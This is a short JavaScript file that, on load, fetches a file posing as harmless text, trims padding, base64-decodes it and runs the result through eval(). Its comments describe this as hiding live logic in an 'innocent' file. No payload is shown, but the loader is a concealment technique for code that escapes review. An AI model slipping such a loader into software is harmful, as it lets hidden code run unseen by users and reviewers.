// app.js
async function unlockSecureLogic() {
    try {
        // 1. Fetch the 'Innocent' text file
        const response = await fetch('logic.txt');
        const encryptedString = await response.text();

        // 2. Use the .slice() coordinates (Skip 4 at start, 3 at end)
        const cleanBase64 = encryptedString.slice(4, -3);

        // 3. Decode the Base64 back into JS code
        const decryptedCode = atob(cleanBase64);

        // 4. Run the code using eval()
        // This turns the string back into live, running logic
        eval(decryptedCode);

        console.log("🔒 JavaScript Payload Executed.");
    } catch (error) {
        console.error("Security Error: Fragmented or Corrupt Logic.");
    }
}

// Start the process
unlockSecureLogic();